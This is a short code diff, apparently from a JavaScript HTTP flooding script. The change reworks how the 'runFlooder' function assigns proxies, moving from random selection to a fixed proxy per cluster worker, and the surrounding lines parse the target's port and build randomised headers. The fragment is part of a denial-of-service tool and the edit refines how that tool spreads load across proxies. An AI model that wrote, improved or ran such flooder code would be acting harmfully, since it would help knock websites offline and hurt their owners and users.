@@ -349,7 +349,7 @@ return result;
 }
 const randstrsValue = randstrs(10);
   function runFlooder() {
-    const proxyAddr = randomElement(proxies);
+    const proxyAddr = proxies[cluster.worker.id % proxies.length];
     const parsedProxy = proxyAddr.split(":");
     const parsedPort = parsedTarget.protocol == "https:" ? "443" : "80";
   encoding_header = [
